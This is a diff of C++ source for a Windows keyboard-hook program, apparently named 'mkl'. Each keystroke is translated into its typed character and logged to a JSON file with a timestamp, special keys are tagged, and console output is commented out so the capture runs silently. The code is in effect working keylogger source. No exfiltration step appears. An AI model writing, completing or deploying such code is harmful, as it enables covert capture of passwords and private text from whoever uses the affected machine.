@@ -42,19 +42,26 @@ json data;
 std::string sJsonVersion = "0.0.0.1";
 int iEventCount = 0;
 
-void addEvent(int code, bool mods[], int time){
+void addEvent(std::string key, bool mods[], int time){
 	iEventCount += 1;
 
 	//create event
+	//json event = {
+	//	{"id", iEventCount},
+	//	{"code", code},
+	//	{"mods", {
+	//		{"shft", mods[0]},
+	//		{"ctrl", mods[1]},
+	//		{"alt", mods[2]}}
+	//	},
+	//	{"time", time}
+	//};
+
+	//{k: '1', t: 4981483}
+
 	json event = {
-		{"id", iEventCount},
-		{"code", code},
-		{"mods", {
-			{"shft", mods[0]},
-			{"ctrl", mods[1]},
-			{"alt", mods[2]}}
-		},
-		{"time", time}
+		{"k", key},
+		{"t", time}
 	};
 
 	//Check for output file
@@ -78,10 +85,9 @@ void addEvent(int code, bool mods[], int time){
 
 	//Write to file:
 	std::ofstream out(pOut);
-	out << data.dump(4);
+	out << data.dump(2);
 
 }
-
 
 
 //Callback function for the hook!
@@ -160,7 +166,7 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 		//If it is a down stroke:
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
 			//print to terminal:
-			std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;
+			//std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;
 
 			bool mods[3] = {shift, ctrl, alt};
 
@@ -172,31 +178,75 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 			//write to keyStates
 			GetKeyboardState(bKeyStates);
 
+			//add in states manually:
+			//0x80 = key down
+			// Inject real modifier state from your hook tracking
+			if (shift) {
+			    bKeyStates[VK_SHIFT]   |= 0x80;
+			    bKeyStates[VK_LSHIFT]  |= 0x80;
+			    bKeyStates[VK_RSHIFT]  |= 0x80;
+			}
+			
+			if (ctrl) {
+			    bKeyStates[VK_CONTROL]  |= 0x80;
+			    bKeyStates[VK_LCONTROL] |= 0x80;
+			    bKeyStates[VK_RCONTROL] |= 0x80;
+			}
+			
+			if (alt) {
+			    bKeyStates[VK_MENU]  |= 0x80;
+			    bKeyStates[VK_LMENU] |= 0x80;
+			    bKeyStates[VK_RMENU] |= 0x80;
+			}
+
 			WCHAR pwszBuff[8];
 			int iBuffSize = 8;
 			int iFlags = 2;
 
-			//Testing with ToInt 
+			std::string sSwResult;
+
+			//Testing with get the unicode value of what is being typed
 			int result = ToUnicode(data.vkCode, data.scanCode, bKeyStates, pwszBuff, iBuffSize, iFlags);
 
-			//std::cout << i << *pwszBuff << std::endl; 
+			//TODO: Temp Solution / UNSAFE!!!
 
-			//Temp Solution:
-			//char ascii = (char)pwszBuff[0];
+			//std::ofstream file(pOut, std::ios::app); // append mode
 
-			//for (int i = 0; i < 8; i++){
-			char ascii = (char)pwszBuff[0];
-			//	std::cout << ascii;
-			//}
+    		//if (!file) return 1;
 
+			switch (pwszBuff[0]){
+				case VK_BACK:
+					sSwResult =  "[\\b]";
+					break;
+				case VK_TAB:
+					sSwResult = "[\\t]";
+					break;
+				case VK_RETURN:
+					sSwResult = "[\\r]";
+					break;
 
-			std::cout << ascii << std::endl;
+				case 0x00:
+					switch (data.vkCode) {
+						case 46: sSwResult = "[DEL]"; break;
+						case 45: sSwResult = "[INS]"; break;
+						case 20: sSwResult = "[CL]"; break;
+						case 38: sSwResult = "[/\\]"; break;
+						case 37: sSwResult = "[<-]"; break;
+						case 39: sSwResult = "[->]"; break;
+						case 40: sSwResult = "[\\/]"; break;
+						case 144:sSwResult = "[NL]"; break;
+						default: sSwResult = "[UKN|" + std::to_string(data.vkCode) + "]";break;
+					}
+					break;
 
-			//Convert to UTF-8
+				default:
+					char ascii = (char)pwszBuff[0];
+					sSwResult = std::string(1,ascii);
+			}
 
-
-			//WideCharToMultiByte(CP_UTF8, 0, *pwszBuff, sizeof(*pwszBuff), out.)
-
+			//One We Have the resulting key, write to the output:
+			//file << sSwResult;
+			addEvent(sSwResult, mods, data.time);
 		}
 	}
 
@@ -229,30 +279,30 @@ int main(int argc, char* argv[]){
 	else {std::cout << k << pOut.filename() << " found." << std::endl;}
 
 
-	// === Init Json ===
-	data["app"] = "mkl";
-	data["version"] = sJsonVersion;
-
-	//Make events array
-	data["events"] = json::array();
-
-	//Write to file:
-	std::ofstream out(pOut);
-	if (!out.is_open()) {
-		std::cout << e << "Unable to open file: " << GetLastError() << std::endl;
-		return 1;
-	}
-	
-	out << data.dump(4);
-	
-	if (out.fail()) {
-		std::cout << e << "Init write Failed: " << GetLastError() << std::endl;
-		return 1;
-	}
-
-	std::cout << k << "Init write success!" << std::endl;
-
-	out.close();
+	//// === Init Json ===
+	//data["app"] = "mkl";
+	//data["version"] = sJsonVersion;
+//
+	////Make events array
+	//data["events"] = json::array();
+//
+	////Write to file:
+	//std::ofstream out(pOut);
+	//if (!out.is_open()) {
+	//	std::cout << e << "Unable to open file: " << GetLastError() << std::endl;
+	//	return 1;
+	//}
+	//
+	//out << data.dump(4);
+	//
+	//if (out.fail()) {
+	//	std::cout << e << "Init write Failed: " << GetLastError() << std::endl;
+	//	return 1;
+	//}
+//
+	//std::cout << k << "Init write success!" << std::endl;
+//
+	//out.close();
 	// =================
 
 
